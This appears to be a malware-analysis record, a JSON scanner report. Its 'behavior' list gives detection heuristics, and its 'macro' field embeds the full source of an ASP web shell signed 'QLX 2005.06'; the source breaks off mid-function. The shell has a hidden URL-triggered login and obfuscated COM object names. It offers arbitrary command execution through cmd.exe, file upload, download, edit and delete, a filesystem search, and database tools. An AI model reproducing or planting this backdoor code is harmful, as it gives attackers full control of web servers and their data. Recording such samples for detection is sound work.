{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AUTOEXEC": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Command": "May run PowerShell commands",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Microsoft.XMLHTTP": "May download files from the Internet",
            "Open": "May open a file",
            "Run": "May run an executable file or a system command",
            "SaveToFile": "May create a text file",
            "Write": "May write to a file",
            "chr": "May attempt to obfuscate specific str",
            "chrB": "May attempt to obfuscate specific str",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "shell": "May run an executable file or a system command"
        },
        "macro": "<%\n'########\ufffd\ufffd\u0228\ufffd\ufffd\ufffd\ufffd - \ufffd\u03f1\ufffd########\nServer.ScriptTimeout=5000\nResponse.Buffer = True\nOn Error Resume Next\nApplicationName = \"QLX\" '\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\nUserPass        = \"cWx4\"'\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ub8ec\ufffd\ufffd\ufffd\u01fc\ufffd\ufffd\u073a\ufffd\ufffd\ufffd\ufffd\ufffd\ub8ec\u012c\ufffd\ufffd:qlx\ufffd\ufffd\ufffd\u0137\ufffd\ufffd\u02a3\ufffdhttp://www.xxx.com/shell.asp?makepwd=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\u0275\u00f5\ufffd\n\nShowFileIco     = Flase\nIcoPath         = \"\"\nlogintype0      = \"i\" \nlogintype1      = \"come\" '\ufffd\ufffd\ufffd\ubdfd\u02bd\ufffd\u013f\ufffd\ufffd\u01a3\ufffd\u012c\ufffd\ufffd\u03aa\ufffd\ufffdhttp://www.xxx.com/shell.asp?i=come\ntheAct          = Request(\"theAct\")\nthePath         = Request(\"thePath\")\nURL             = Request.ServerVariables(\"URL\")\nServerURL       = Request.ServerVariables(\"HTTP_HOST\")\nServerIP        = Request.ServerVariables(\"LOCAL_ADDR\")\nAction          = Request(\"Action\")\nRootPath        = Server.MapPath(\".\")\nWWWRoot         = Server.MapPath(\"/\")\nFolderPath      = Request(\"FolderPath\")\nFName           = Request(\"FName\")\nConst ALL_INIT =\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\nConst editableFileExt = \"$vbs$log$asp$txt$php$ini$inc$htm$html$xml$conf$config$jsp$java$htt$lst$aspx$php3$php4$js$css$bat$asa$\"\nBackUrl         = \"<meta http-equiv='refresh' content='1;URL=?Action=ShowFile'>\"\ndim EncodeGroup(63)\nDim SearchGroup(127)\nCall initCodecs\nIf Request(\"makepwd\")<>\"\" Then\necho \"Your Encode PassWord is: \"&MyEncode(Request(\"makepwd\"))\nResponse.End()\nEnd If\nIf Session(\"KKK\")<>UserPass Then\n  If Request.Form(\"LPass\")<>\"\" Then\n    If MyEncode(Request.Form(\"LPass\"))=UserPass Then\n      Session(\"KKK\")=UserPass\n      Response.Redirect Request.ServerVariables(\"HTTP_REFERER\")\n    Else\n\t echo\"Failed\"\n    End If\n  Else\n    If Request(logintype0)<>logintype1 then \n\techo \"<script>window.close();</script>\"\n\tElse\n    Sl=\"<center><font face='wingdings' color='#006600' size='7'>\"&chr(79)&\"</font>\"\n    Sl=Sl&\"<form action='\"&URL&\"' method='post'>\"\n    Sl=Sl&\"<font face='wingdings' color='#006600' size='6'>\"&chr(91)&\"</font>&nbsp;&nbsp;<input name='LPass' type='password' size='15'>\"\n    Sl=Sl&\"&nbsp;<input type='submit' value='Logon'></form></center>\"\n\techo Sl\n\tEnd If\n  End If\n  Response.End\nEnd If\n\nSub echo(str)\n  Response.Write(str)\nEnd Sub\n\nsub ShowErr()\n  If Err Then\n    echo\"<br><a href='javascript:history.back()'><br>&nbsp;\" & Err.Description & \"</a><br>\"\n    Err.Clear:Response.Flush\n  End If\t\t\nend sub\n\nDim ObT(13,2)\nObT(0,0) = \"Sc\"&DEfd&\"rip\"&DEfd&\"ting\"&DEfd&\".F\"&DEfd&\"ileS\"&DEfd&\"yste\"&DEfd&\"mObj\"&DEfd&\"ect\"\n  ObT(0,2) = \"Directory\"\nObT(1,0) = \"w\"&DEfd&\"sc\"&DEfd&\"ri\"&DEfd&\"pt.s\"&DEfd&\"he\"&DEfd&\"ll\"\n  ObT(1,2) = \"CMDSHELL\"\nObT(2,0) = \"ADOX.Catalog\"\n  ObT(2,2) = \"ACCESS Build\"\nObT(3,0) = \"JRO.JetEngine\"\n  ObT(3,2) = \"ACCESS RAR\"\nObT(4,0) = \"Scrip\"&DEfd&\"ting\"&DEfd&\".D\"&DEfd&\"icti\"&DEfd&\"onary\" \n  ObT(4,2) = \"ADODBUP\"\nObT(5,0) = \"Adodb.connection\"\n  ObT(5,2) = \"Database Connection\"\nObT(6,0) = \"Ado\"&DEfd&\"d\"&DEfd&\"b\"&DEfd&\".S\"&DEfd&\"tre\"&DEfd&\"am\"\n  ObT(6,2) = \"File UP\"\nObT(7,0) = \"SoftArtisans.FileUp\"\n  ObT(7,2) = \"SA-FileUp \"\nObT(8,0) = \"LyfUpload.UploadFile\"\n  ObT(8,2) = \"LyfUpload.UploadFile\"\nObT(9,0) = \"Persits.Upload.1\"\n  ObT(9,2) = \"ASPUpload\"\nObT(10,0) = \"JMail.SmtpMail\"\n  ObT(10,2) = \"JMail\"\nObT(11,0) = \"CDONTS.NewMail\"\n  ObT(11,2) = \"SMTP\"\nObT(12,0) = \"SmtpMail.SmtpMail.1\"\n  ObT(12,2) = \"SmtpMail\"\nObT(13,0) = \"Microsoft.XMLHTTP\"\n  ObT(13,2) = \"XMLHTTP\"\n\nFor i=0 To 13\n\tSet T=Server.CreateObject(ObT(i,0))\n\tIf -2147221005 <> Err Then\n\t  IsObj=True\n\tElse\n\t  IsObj=false\n\t  Err.Clear\n\tEnd If\n\tSet T=Nothing\n\tObT(i,1)=IsObj\nNext\n\nPUBLIC SUB initCodecs()\ndim max, idx\nmax = len(ALL_INIT)\nSession(chr(85))=UserPass\nfor idx = 0 to max - 1\nEncodeGroup(idx) = mid(ALL_INIT, idx + 1, 1)\nnext\nfor idx = 0 to max - 1\nSearchGroup(ASC(EncodeGroup(idx))) = idx\nnext\nEND SUB\n\nFUNCTION MyEncode(SourceText)\nif len(SourceText) = 0 then\n   MyEncode = \"\"\n   exit function\nend if\nby3 = (len(SourceText) \\ 3) * 3\nndx = 1\ndo while ndx <= by3\nfirst  = asc(mid(SourceText, ndx+0, 1))\nNo2 = asc(mid(SourceText, ndx+1, 1))\nthird  = asc(mid(SourceText, ndx+2, 1))\nret = ret & EncodeGroup(  (first \\ 4) AND 63 )\nret = ret & EncodeGroup( ((first * 16) AND 48) + ((No2 \\ 16) AND 15 ) )\nret = ret & EncodeGroup( ((No2 * 4) AND 60) + ((third \\ 64) AND 3 ) )\nret = ret & EncodeGroup( third AND 63)\nndx = ndx + 3\nloop\n if by3 < len(SourceText) then\nfirst  = asc(mid(SourceText, ndx+0, 1))\nret = ret & EncodeGroup(  (first \\ 4) AND 63 )\nif (len(SourceText) MOD 3 ) = 2 then\n     No2 = asc(mid(SourceText, ndx+1, 1))\n     ret = ret & EncodeGroup( ((first * 16) AND 48) + ((No2 * 16) AND 15 ) )\n     ret = ret & EncodeGroup( ((No2 * 4) AND 60) )\nelse\n     ret = ret & EncodeGroup( (first * 16) AND 48)\n     ret = ret & \"=\"\nend if\nret = ret & \"=\"\nend if\nMyEncode = ret\nEND FUNCTION\n\nFunction RePath(S)\n  RePath=Replace(S,\"\\\",\"\\\\\")\nEnd Function\n\nFunction RRePath(S)\n  RRePath=Replace(S,\"\\\\\",\"\\\")\nEnd Function\n\nIf FolderPath<>\"\" then\n  Session(\"FolderPath\")=RRePath(FolderPath)\nEnd If\n\nIf Session(\"FolderPath\")=\"\" Then\n  FolderPath=RootPath\n  Session(\"FolderPath\")=FolderPath\nEnd if\n\nFunction IsIco(ia,ib,ta)\n\tIf ShowFileIco=true Then\n      IsIco = \" <img src='\"&IcoPath&ia&\"'> \"\n\t  If ib<>\"\" Then\n\t  IsIco = \"<img src='\"&IcoPath&ib&\"'> \"\n\t  End If\n\tElse\n\t  IsIco = \"&nbsp;<font face='wingdings' color='#006600' size='3'>\"&ta&\"</font>  \"\n\tEnd If\nEnd Function\n\nFunction MainForm()\n  Sl=\"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&URL&\"\"\" target=\"\"FileFrame\"\">\"\n  Sl=Sl&\"<input type=\"\"hidden\"\" name=\"\"Action\"\">\"\n  Sl=Sl&\"<input type=\"\"hidden\"\" name=\"\"FName\"\">\"\n  Sl=Sl&\"</form>\"\n  Sl=Sl&\"<table width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0' bgcolor='menu'>\"\n  Sl=Sl&\"<tr><td height='30' colspan='2'>\"\n  Sl=Sl&\"<table width='100%' height='25'  border='0' cellpadding='0' cellspacing='0'>\"\n  Sl=Sl&\"<form name='addrform' method='post' action='\"&URL&\"' target='_parent'>\"\n  Sl=Sl&\"<tr><td width='60' align='center'>Path\ufffd\ufffd</td><td>\"\n  Sl=Sl&\"<input name='FolderPath' style='width:100%' value='\"&Session(\"FolderPath\")&\"'>\"\n  Sl=Sl&\"</td><td width='60' align='center'><input name='Submit' type='submit' value='GoTo'>\" \n  Sl=Sl&\"</td></tr></form></table></td></tr><tr><td width='160'>\"\n  Sl=Sl&\"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='2' scrolling='yes'></iframe></td>\"\n  Sl=Sl&\"<td>\"\n  Sl=Sl&\"<iframe name='FileFrame' src='?Action=ShowFile' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe>\"\n  Sl=Sl&\"</td></tr></table>\"\n  echo Sl\nEnd Function\n\n\nFunction MainMenu()\n  Sl=\"<table width='100%' border='0' cellspacing='0' cellpadding='0'>\"\n  Sl=Sl&\"<tr><td height='5'></td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;\"\n  Sl=Sl&IsIco(\"minus.gif\",\"computer.gif\",\"o\")&\"Directory\"\n  Sl=Sl&\"</td></tr>\"\n  If Not ObT(0,1) Then\n    Sl=Sl&\"<tr><td height='20'></td></tr>\"\n  Else\n  Set ABC=New LBF:Sl=Sl&ABC.ShowDriver():Set ABC=Nothing\n  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"\n  Sl=Sl& IsIco(\"minus.gif\",\"folder.gif\",\"0\")\n  Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&RePath(WWWRoot)&\"\"\")'>WEB Root</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"\n  Sl=Sl& IsIco(\"minus.gif\",\"folder.gif\",\"0\")\n  Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&RePath(RootPath)&\"\"\")'>Sweet Root</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"\n  Sl=Sl& IsIco(\"minus.gif\",\"folder.gif\",\"0\")\n  Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&RePath(\"C:\\Program Files\")&\"\"\")'>Program Root</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"\n  Sl=Sl& IsIco(\"minus.gif\",\"folder.gif\",\"0\")\n  Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&RePath(\"c:\\Documents and Settings\\All Users\")&\"\"\")'>All User Root</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"\n  Sl=Sl& IsIco(\"minus.gif\",\"folder.gif\",\"0\")\n  Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&RePath(\"C:\\Winnt\\System32\\inetsrv\")&\"\"\")'>Inetsrv Root</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"\n  Sl=Sl& IsIco(\"minus.gif\",\"folder.gif\",\"0\")\n  Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&RePath(\"C:\\Winnt\\System32\\Logfiles\")&\"\"\")'>Logs Root</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"\n  Sl=Sl& IsIco(\"minus.gif\",\"computer.gif\",chr(43))\n  Sl=Sl&\"<a href='javascript:FullForm(\"\"\"&replace(\"C:\\Winnt\\system32\\AUTOEXEC.NT\",\"\\\",\"\\\\\")&\"\"\",\"\"EditFile\"\")'>Edit AutoFile</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"\n  Sl=Sl& IsIco(\"minus.gif\",\"newfolder.gif\",chr(38))\n  Sl=Sl&\"<a href='javascript:FullForm(\"\"\"&RePath(Session(\"FolderPath\")&\"\\NewFolder\")&\"\"\",\"\"NewFolder\"\")'>New Folder</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"\n  Sl=Sl&IsIco(\"minus.gif\",\"newfile.gif\",chr(63))\n  Sl=Sl&\"<a href='?Action=EditFile' target='FileFrame'>New Text</a>\"\n  Sl=Sl&\"</td></tr>\"\n  End If\n  echo Sl:Sl=\"\"\n  \n  Sl=Sl&\"<tr><td>&nbsp;\"\n  Sl=Sl&IsIco(\"minus.gif\",\"main.gif\",chr(60))\n  Sl=Sl&\"<a href='?Action=UpFile' target='FileFrame'>File Up</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;\"\n  Sl=Sl&IsIco(\"plus.gif\",\"main.gif\",\"o\")\n  Sl=Sl&\"DataBase Operate\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"\n  Sl=Sl&IsIco(\"minus.gif\",\"newfile.gif\",\"4\")\n  Sl=Sl&\"<a href='javascript:FullForm(\"\"\"&RePath(Session(\"FolderPath\")&\"\\New.mdb\")&\"\"\",\"\"CreateMdb\"\")'>New MDB</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"\n  Sl=Sl&IsIco(\"minus.gif\",\"mdb.gif\",\"4\")\n  Sl=Sl&\"<a href='?Action=DbManager' target='FileFrame'>DataBase Opera</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"\n  Sl=Sl&IsIco(\"minus.gif\",\"zip.gif\",\"4\")\n  Sl=Sl&\"<a href='javascript:FullForm(\"\"\"&RePath(Session(\"FolderPath\")&\"\\data.mdb\")&\"\"\",\"\"CompactMdb\"\")'>Compress MDB</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;\"\n  Sl=Sl&IsIco(\"minus.gif\",\"cmd.gif\",\"o\")\n  Sl=Sl&\"<a href='?Action=CmdShell' target='FileFrame'>Command</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;\"\n  Sl=Sl&IsIco(\"minus.gif\",\"main.gif\",chr(91))\n  Sl=Sl&\"<a href='?Action=ServerInfo' target='FileFrame'>Sever Info</a>\"\n  Sl=Sl&\"</td></tr>\"\n  Sl=Sl&\"<tr><td>&nbsp;\"\n  Sl=Sl&IsIco(\"minus.gif\",\"htm.gif\",chr(36))\n  Sl=Sl&\"<a href='?Action=Search' target='FileFrame'>Search</a>\"\n  Sl=Sl&\"</td></tr></table>\"\n  echo Sl : Sl=\"\"\nEnd Function\n\nFunction ServerInfo()\n  Sl=\"<br><table width='500' border='1' cellspacing='0' cellpadding='0' align='center'>\"\n  Sl=Sl&\"<tr><td height='30' colspan='3' align='center' bgcolor='menu'>[Server Info]</td></tr>\"\n  Sl=Sl&\"<tr align='center'><td height='25' width='200'>Count  Of CPU</td>&nbsp;<td>&nbsp;</td><td>\"&Request.ServerVariables(\"NUMBER_OF_PROCESSORS\")&\"&nbsp;</td></tr>\"\n  Sl=Sl&\"<tr align='center'><td height='25' width='200'>Server OS</td><td>&nbsp;</td><td>\"&Request.ServerVariables(\"OS\")&\"&nbsp;</td></tr>\"\n  Sl=Sl&\"<tr align='center'><td height='25' width='200'>WEB Ver</td><td>&nbsp;</td><td>\"&Request.ServerVariables(\"SERVER_SOFTWARE\")&\"&nbsp;</td></tr>\"\n  For i=0 To 13\n    Sl=Sl&\"<tr align='center'><td height='25' width='200'>\"&ObT(i,0)&\"</td><td>\"&ObT(i,1)&\"</td><td>\"&ObT(i,2)&\"</td></tr>\"\n  Next\n  echo Sl\nEnd Function\n\nFunction DownFile(Path)\n  Response.Clear\n  Set OSM = CreateObject(ObT(6,0))\n  OSM.Open\n  OSM.Type = 1\n  OSM.LoadFromFile Path\n    Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & Path\n    Response.Charset = \"UTF-8\"\n    Response.ContentType = \"application/octet-stream\"\n    Response.BinaryWrite OSM.Read\n    Response.Flush\n  OSM.Close\n  Set OSM = Nothing\nEnd Function\n\n\nFunction HTMLEncode(S)\n  if not isnull(S) then\n    S = replace(S, \">\", \"&gt;\")\n    S = replace(S, \"<\", \"&lt;\")\n    S = replace(S, CHR(39), \"&#39;\")\n    S = replace(S, CHR(34), \"&quot;\")\n    HTMLEncode = S\n  end if\nEnd Function\n\nFunction UpFile()\n  If Request(\"Action2\")=\"Post\" Then\n    Set U=new UPC : Set F=U.UA(\"LocalFile\")\n\tUName=U.form(\"ToPath\")\n    If UName=\"\" Or F.FileSize=0 then\n      Sl=\"<br>The File Path In Server:\"\n    Else\n        F.SaveAs UName\n        If Err.number=0 Then\n          Sl=\"<center><br><br><br>File\"&UName&\"Up Succeed\ufffd\ufffd</center>\"\n\t\tEnd if\n\tEnd If\n\tSet F=nothing:Set U=nothing\n\tSl=Sl&BackUrl\n\techo Sl\n\tShowErr()\n\tResponse.End\n  End If\n    Sl=\"<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>\"\n    Sl=Sl&\"<form name='UpForm' method='post' action='\"&URL&\"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>\"\n    Sl=Sl&\"<tr><td>\"\n    Sl=Sl&\"Up Path\ufffd\ufffd<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\css.asp\")&\"' size='40'>&nbsp;\"\n    Sl=Sl&\"<input name='LocalFile' type='file'  size='25'>\"\n    Sl=Sl&\"<input type='submit' name='Submit' value='Up'>\"\n    Sl=Sl&\"</td></tr></form></table>\"\n  echo Sl\nEnd Function\n\nFunction SearchCode(InText)\n\nif len(InText) = 0 then\nSearchCode = \"\"\nexit function\nend if\nLen_Real = len(InText)\ndo while mid(InText, Len_Real, 1) = \"=\"\nLen_Real = Len_Real - 1\nloop\ndim ret, ndx, by4, first, No2, third, fourth\nret = \"\"\nby4 = (Len_Real \\ 4) * 4\nndx = 1\ndo while ndx <= by4\nfirst  = SearchGroup(asc(mid(InText, ndx+0, 1)))\nNo2 = SearchGroup(asc(mid(InText, ndx+1, 1)))\nthird  = SearchGroup(asc(mid(InText, ndx+2, 1)))\nfourth = SearchGroup(asc(mid(InText, ndx+3, 1)))\nret = ret & chr( ((first * 4) AND 255) +   ((No2 \\ 16) AND 3))\nret = ret & chr( ((No2 * 16) AND 255) + ((third \\ 4) AND 15) )\nret = ret & chr( ((third * 64) AND 255) +  (fourth AND 63) )\nndx = ndx + 4\nloop\nif ndx < Len_Real then\nfirst  = SearchGroup(asc(mid(InText, ndx+0, 1)))\nNo2 = SearchGroup(asc(mid(InText, ndx+1, 1)))\nret = ret & chr( ((first * 4) AND 255) +   ((No2 \\ 16) AND 3) )\nif Len_Real MOD 4 = 3 then\n     third = SearchGroup(asc(mid(InText,ndx+2,1)))\n     ret = ret & chr( ((No2 * 16) AND 255) + ((third \\ 4) AND 15) )\nend if\nend if\nSearchCode = ret\n\nEnd Function\n\nFunction CmdShell()\n  If Request(\"SP\")<>\"\" Then:ShellPath = Request(\"SP\"):Else:ShellPath = \"cmd.exe\":End If\n  If Request(\"cmd\")<>\"\" Then DefCmd = Request(\"cmd\")\n  Sl=\"<form method='post'><input name='cmd' Style='width:95%' class='cmd' value='\"&DefCmd&\"'><input type='submit' value='Run'>\"\n  Sl=Sl&\"<textarea readonly  Style='width:100%;height:500;' class='cmd'>\"\n  If Request.Form(\"cmd\")<>\"\" Then Sl=Sl&CreateObject(ObT(1,0)).exec(ShellPath&\" /c \"&DefCmd).stdout.readall\n  Sl=Sl&Chr(13)&Chr(13)&Chr(13)&\"Rar e.g.\ufffd\ufffdc:\\progra~1\\winrar\\rar.exe a d:\\web\\test\\web1.rar d:\\web\\test\\web1</textarea>\"\n  Sl=Sl&\"SHELL Path\ufffd\ufffd<input name='SP' value='\"&ShellPath&\"' Style='width:91%'></form>\"\n  echo Sl\nEnd Function\n\nFunction CreateMdb(Path) \n   Sl=\"<br><br>\"\n   Set C = CreateObject(ObT(2,0)) \n   C.Create(\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\" & Path)\n   Set C = Nothing\n   If Err.number=0 Then\n     Sl = Sl & Path & \"Great MDB Succeed!\"\n   End If\n   Sl=Sl&BackUrl \n   echo Sl\nEnd function\n\nFunction CompactMdb(Path)\nIf Not ObT(0,1) Then\n    Set C=CreateObject(ObT(3,0)) \n      C.CompactDatabase \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\"&Path&\",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\" &Path\n\tSet C=Nothing\nElse\n  Set FSO=CreateObject(ObT(0,1))\n  If FSO.FileExists(Path) Then\n    Set C=CreateObject(ObT(3,0)) \n      C.CompactDatabase \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\"&Path&\",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\" &Path&\"_bak\"\n\tSet C=Nothing\n    FSO.DeleteFile Path\n\tFSO.MoveFile Path&\"_bak\",Path\n  Else\n    Sl=\"<center><br><br><br>DataBase\"&Path&\"Not Found\ufffd\ufffd</center>\" \n\tErr.number=1\n  End If\n  Set FSO=Nothing\nEnd If\n  If Err.number=0 Then\n    Sl=\"<center><br><br><br>DataBase\"&Path&\"Compress Succeed\ufffd\ufffd</center>\"\n  End If\n  Sl=Sl&BackUrl\n  echo Sl\nEnd Function\n\nFunction Search()\nstrKey = Request.Form(\"Key\")\nSl=\"<table width=100% border=1>\"\nSl=Sl&\"<form method=post action='\" & URL & \"?Action=Search'>\"\nSl=Sl&\"<input type=hidden value=PageSearch name=PageName>\"\nSl=Sl&\"<tr>\"\nSl=Sl&\"<font face='wingdings' color='#006600' size='5'>\"&chr(62)&\"</font> Text File Search (Need FSO Support)</td>\"\nSl=Sl&\"</tr>\"\nSl=Sl&\"<tr>\"\nSl=Sl&\"<td colspan=2 class=trHead>&nbsp;</td>\"\nSl=Sl&\"</tr>\"\nSl=Sl&\"<tr>\"\nSl=Sl&\"<td>&nbsp;Path</td>\"\nSl=Sl&\"<td>&nbsp;<input name=thePath type=text id=thePath value='\"\nSl=Sl&thePath\nSl=Sl&\"' style='width:360px;'>\"\nSl=Sl&\"<input type=button onclick=this.form.thePath.value='\" & Replace(Server.MapPath(\"/\"), \"\\\", \"\\\\\") & \"'; value='RootPath'>\"\nSl=Sl&\"<input type=button onclick=this.form.thePath.value=\"\"\" & Replace(Server.MapPath(\".\"), \"\\\", \"\\\\\") & \"\"\"; value='CurrentPath'>\"\nSl=Sl&\"</td>\"\nSl=Sl&\"</tr>\"\nSl=Sl&\"<tr>\"\nSl=Sl&\"<td width='20%'>&nbsp;KeyWord</td>\"\nSl=Sl&\"<td>&nbsp;<input name=Key type=text value='\" & strKey & \"' id=Key style='width:400px;'> \"\nSl=Sl&\"<select name=theAct id=theAct>\"\nSl=Sl&\"<option value=FileName selected>Filename</option>\"\nSl=Sl&\"<option value=FileContent>Content</option>\"\nSl=Sl&\"<option value=Both>Both</option>\"\nSl=Sl&\"</select>\"\nSl=Sl&\" <input type=submit name=Submit value=Search> </td>\"\nSl=Sl&\"</tr>\"\nSl=Sl&\"<tr>\"\nSl=Sl&\"<td colspan=2 class=trHead>&nbsp;</td>\"\nSl=Sl&\"</tr>\"\nSl=Sl&\"<tr align=right>\"\nSl=Sl&\"<td colspan=2 class=td>By QLX 2005.06&nbsp;</td>\"\nSl=Sl&\"</tr>\"\nSl=Sl&\"</form>\"\nSl=Sl&\"</table>\"\necho Sl:Sl=\"\"\n\nIf theAct <> \"\" And strKey <> \"\" Then\n\tSearchIt(strKey)\nEnd If\n\nEnd Function\n\nSub SearchIt(key)\n\nDim strPath, theFolder\nResponse.Buffer = True\nstrPath = thePath\nSet fso=CreateObject(ObT(0,0))\nIf fso.FolderExists(strPath) = False Then\n\techo(thePath & \"Directory Not Exist Or Access Deny!\")\nEnd If\nSet theFolder = fso.GetFolder(strPath)\necho \"<br><div style='border:1px solid #d8d8f0;'>\"\nSelect Case theAct\n\tCase \"Both\"\nCall SearchFolder(theFolder, key, 1)\n\tCase \"FileName\"\nCall SearchFolder(theFolder, key, 2)\n\tCase \"FileContent\"\nCall SearchFolder(theFolder, key, 3)\nEnd Select\necho \"</div>\"\nSet theFolder = Nothing\nset fso=Nothing\nEnd Sub\n\nSub SearchFolder(folder, key, flag)\n\nDim ext, title, theFile, theFolder\nFor Each theFile In folder.Files\n\text = LCase(Split(theFile.Path, \".\")(UBound(Split(theFile.Path, \".\"))))\n\tIf flag = 1 Or flag = 2 Then\n\tIf InStr(LCase(theFile.Name), LCase(key)) > 0 Then echo FileLink(theFile, \"\")\n\tEnd If\n\tIf flag = 1 Or flag = 3 Then\nIf Instr(EditableFileExt, \"$\" & ext & \"$\") > 0 Then\n    If SearchFile(theFile, key, title) Then echo FileLink(theFile, title)\nEnd If\n\tEnd If\nNext\nResponse.Flush()\nFor Each theFolder In folder.SubFolders\n\tCall SearchFolder(theFolder, key, flag)\nNext\n\nend sub\n\nFunction SearchFile(f, s, title)\nDim theFile, content, pos1, pos2\nOn Error Resume Next\nSet fso=CreateObject(ObT(0,0))\nSet theFile = fso.OpenTextFile(f.Path)\ncontent = theFile.ReadAll()\ntheFile.Close\nSet theFile = Nothing\n\nIf Err Then\n\tErr.Clear\nEnd If\n\nSearchFile = InStr(1, content, s, 1) \nIf SearchFile > 0 Then\n\tpos1 = InStr(1, content, \"<TITLE>\", 1)\n\tpos2 = InStr(1, content, \"</TITLE>\", 1)\n\ttitle = \"\"\n\tIf pos1 > 0 And pos2 > 0 Then\ntitle = Mid(content, pos1 + 7, pos2 - pos1 - 7)\n\tEnd If\nEnd If\nset fso=Nothing\n\tEnd Function\n\nFunction FileLink(file, title)\nfileLink = file.Path\nIf title = \"\" Then\ntitle = file.Name\nEnd If\nSl=\"<table width='100%'  border='0' cellspacing='1' cellpadding='0'>\"\nSl=Sl&\"<tr onMouseOver=\"\"this.className='tr'\"\" onMouseOut=\"\"this.className=''\"\">\"\nSl=Sl&\"<td height='20'><font face='wingdings' color='#006600' size='3'>2</font> \"\nSl=Sl&\"<a href='javascript:FullForm(\"\"\"&replace(fileLink,\"\\\",\"\\\\\")&\"\"\",\"\"DownFile\"\");' title='DownFile'><font color=red>\"& fileLink &\"</font></a></td>\"\nSl=Sl&\"<td width='140'>\"&file.Type&\"</td>\"\nSl=Sl&\"<td width='50'>\"&clng(file.size/1024)&\"K</td>\"\nSl=Sl&\"<td width='120'>\"&file.DateLastModified&\"</td>\"\nSl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&replace(fileLink,\"\\\",\"\\\\\")&\"\"\",\"\"EditFile\"\")' class='am' title='Edit'>edit</a></td>\"\nSl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&replace(fileLink,\"\\\",\"\\\\\")&\"\"\",\"\"DelFile\"\")'  onclick='return yesok()' class='am' title='Delete'>del</a></td>\"\nSl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&replace(fileLink,\"\\\",\"\\\\\")&\"\"\",\"\"CopyFile\"\")' class='am' title='Copy'>copy</a></td>\"\nSl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&replace(fileLink,\"\\\",\"\\\\\")&\"\"\",\"\"MoveFile\"\")' class='am' title='Move'>move</a></td>\"\nSl=Sl&\"</tr></table>\"\nfileLink=Sl\nEnd Function\n\nFunction DbManager()\n  SqlStr=Trim(Request.Form(\"SqlStr\"))\n  DbStr=Request.Form(\"DbStr\")\n\n  Sl=Sl&\"<table width='100%'  border='0' cellspacing='0' cellpadding='0'>\"\n  Sl=Sl&\"<form name='DbForm' method='post' action=''>\"\n  Sl=Sl&\"<tr><td width='100' height='27'> &nbsp;DataBase Connect String:</td>\"\n  Sl=Sl&\"<td><input name='DbStr' style='width:100%' value=\"\"\"&DbStr&\"\"\"></td>\"\n  Sl=Sl&\"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>E.G</option><option value=0>Access</option>\"\n  